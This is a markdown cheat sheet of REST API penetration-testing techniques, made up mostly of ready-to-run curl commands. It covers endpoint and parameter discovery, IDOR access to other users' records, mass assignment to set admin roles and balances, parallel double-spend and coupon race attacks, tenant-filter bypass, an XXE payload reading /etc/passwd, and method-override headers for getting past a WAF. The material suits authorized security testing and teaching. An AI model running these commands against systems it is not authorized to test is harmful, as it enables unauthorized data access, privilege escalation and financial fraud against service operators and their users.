# REST API Testing Patterns

## Endpoint Discovery

### Common Paths
```bash
# Admin/internal endpoints
for path in /admin /internal /debug /metrics /health /status /info /env /config /swagger /api-docs; do
  curl -sk -o /dev/null -w "%{http_code} $path\n" "$BASE_URL$path"
done

# API versioning (older versions may lack auth)
for v in v1 v2 v3 v0 v1.0 v2.0; do
  curl -sk -o /dev/null -w "%{http_code} /$v/users\n" "$BASE_URL/$v/users"
done

# Hidden methods on known endpoints
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  curl -sk -X $method -o /dev/null -w "%{http_code} $method\n" "$ENDPOINT"
done
```

### Parameter Discovery
```bash
# Arjun for parameter fuzzing
arjun -u "$ENDPOINT" -m GET
arjun -u "$ENDPOINT" -m POST --json

# Common parameter names
for param in id user_id email username token debug admin role type status; do
  curl -sk "$ENDPOINT?$param=test" -o /dev/null -w "%{http_code} $param\n"
done
```

## BOLA/IDOR Patterns

### ID Types and Manipulation
| ID Type | Test Strategy |
|---------|--------------|
| Sequential integer | Increment/decrement: `id=1`, `id=2`, `id=0` |
| UUID | Swap with other user's UUID (from responses/tokens) |
| Encoded (base64) | Decode, modify, re-encode |
| Composite | `org_id/user_id` — change org_id portion |
| Slug | Try other users' slugs: `/users/admin`, `/users/john` |

### Testing Pattern
```bash
# 1. Create resource as User A, note the ID
# 2. Try to access/modify with User B's token
curl -sk -H "Authorization: Bearer $TOKEN_B" "$BASE_URL/api/resources/$RESOURCE_A_ID"
# 3. Try collection endpoints
curl -sk -H "Authorization: Bearer $TOKEN_B" "$BASE_URL/api/resources"
# 4. Try with no auth
curl -sk "$BASE_URL/api/resources/$RESOURCE_A_ID"
```

### Common BOLA Locations
- `/api/users/{id}` — user profile access
- `/api/orders/{id}` — order details
- `/api/documents/{id}` — file download
- `/api/invoices/{id}` — financial data
- `/api/messages/{id}` — private messages
- `/api/settings/{id}` — account settings modification

## Mass Assignment

### Detection
```bash
# 1. GET the resource to see all fields
curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/users/me" | jq .
# Response: {"id":1,"name":"test","email":"test@x.com","role":"user","verified":false,"balance":0}

# 2. Try to set privileged fields via PUT/PATCH
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "$BASE_URL/api/users/me" -d '{"role":"admin","verified":true,"balance":99999}'

# 3. GET again to check what stuck
curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/users/me" | jq .
```

### Common Privileged Fields
- `role`, `is_admin`, `admin`, `type`
- `verified`, `is_verified`, `email_verified`
- `balance`, `credits`, `quota`
- `plan`, `tier`, `subscription`
- `org_id`, `tenant_id` (tenant isolation bypass)
- `created_at`, `updated_at` (timestamp manipulation)
- `password`, `password_hash` (direct password set)

## Race Conditions

### Double-Spend Pattern
```bash
# Parallel requests to transfer/redeem/apply
seq 1 20 | xargs -P20 -I{} curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "$BASE_URL/api/transfer" -d '{"to":"attacker","amount":100}'
```

### TOCTOU (Time-of-Check-Time-of-Use)
```bash
# 1. Check balance (returns 100)
# 2. Simultaneously: transfer 100 to A AND transfer 100 to B
# If both succeed → double-spend
parallel --jobs 2 ::: \
  "curl -sk -X POST '$BASE_URL/api/transfer' -H 'Authorization: Bearer $TOKEN' -d '{\"to\":\"A\",\"amount\":100}'" \
  "curl -sk -X POST '$BASE_URL/api/transfer' -H 'Authorization: Bearer $TOKEN' -d '{\"to\":\"B\",\"amount\":100}'"
```

### Coupon/Promo Race
```bash
# Apply same single-use coupon multiple times in parallel
seq 1 10 | xargs -P10 -I{} curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "$BASE_URL/api/cart/apply-coupon" -d '{"code":"SINGLE_USE_50OFF"}'
```

## Pagination & Data Exposure

```bash
# Excessive page size
curl -sk "$BASE_URL/api/users?page=1&per_page=99999" -H "Authorization: Bearer $TOKEN"
# Negative offset
curl -sk "$BASE_URL/api/users?offset=-1" -H "Authorization: Bearer $TOKEN"
# Cursor manipulation
curl -sk "$BASE_URL/api/users?cursor=AAAA" -H "Authorization: Bearer $TOKEN"
# Filter bypass (access other tenant's data)
curl -sk "$BASE_URL/api/users?tenant_id=OTHER_TENANT" -H "Authorization: Bearer $TOKEN"
```

## Content-Type Manipulation

```bash
# Switch content type to bypass validation
# JSON → XML (XXE potential)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# JSON → form-urlencoded (different parser, different validation)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'name=test&role=admin'

# Multipart (file upload endpoints may accept unexpected fields)
curl -sk -X POST "$ENDPOINT" -F "file=@test.txt" -F "role=admin"
```

## HTTP Method Override

```bash
# When PUT/DELETE are blocked by WAF/proxy
curl -sk -X POST "$ENDPOINT" -H "X-HTTP-Method-Override: DELETE"
curl -sk -X POST "$ENDPOINT" -H "X-Method-Override: PUT"
curl -sk -X POST "$ENDPOINT" -H "X-HTTP-Method: PATCH"
curl -sk -X POST "$ENDPOINT?_method=DELETE"
```

## Error-Based Information Disclosure

### Trigger Verbose Errors
```bash
# Type confusion
curl -sk "$BASE_URL/api/users/not_a_number"
# Missing required fields
curl -sk -X POST "$BASE_URL/api/users" -H "Content-Type: application/json" -d '{}'
# Invalid JSON
curl -sk -X POST "$BASE_URL/api/users" -H "Content-Type: application/json" -d '{"broken'
# Oversized input
curl -sk "$BASE_URL/api/search?q=$(python3 -c "print('A'*10000)")"
```

### What to Look For in Errors
- Stack traces (framework, language, version)
- Database errors (table names, column names, query structure)
- Internal paths (`/app/src/controllers/user.js`)
- Service names (`user-service.internal:8080`)
- Framework-specific debug pages (Django, Laravel, Spring Boot)
